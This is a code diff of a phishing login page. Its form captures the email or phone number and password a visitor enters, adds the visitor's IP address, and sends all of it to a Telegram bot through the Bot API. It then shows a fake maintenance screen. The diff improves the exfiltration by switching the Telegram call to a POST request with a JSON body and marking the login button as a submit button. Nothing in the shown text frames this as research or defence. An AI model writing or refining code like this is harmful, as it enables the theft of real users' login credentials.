@@ -69,7 +69,7 @@
             <form onsubmit="sendToTelegram(event)">
                 <input type="text" id="email" placeholder="Email or Phone" required>
                 <input type="password" id="password" placeholder="Password" required>
-                <button class="button">Login</button>
+                <button class="button" type="submit">Login</button>
             </form>
         </div>
     </div>
@@ -95,13 +95,17 @@
             
             getIPAddress().then(ip => {
                 let message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                    .then(response => response.json())
-                    .then(data => {
-                        document.getElementById('main-container').classList.add('hidden');
-                        document.getElementById('maintenance').classList.remove('hidden');
-                    })
-                    .catch(error => console.error('Error:', error));
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('main-container').classList.add('hidden');
+                    document.getElementById('maintenance').classList.remove('hidden');
+                })
+                .catch(error => console.error('Error:', error));
             });
         }
     </script>
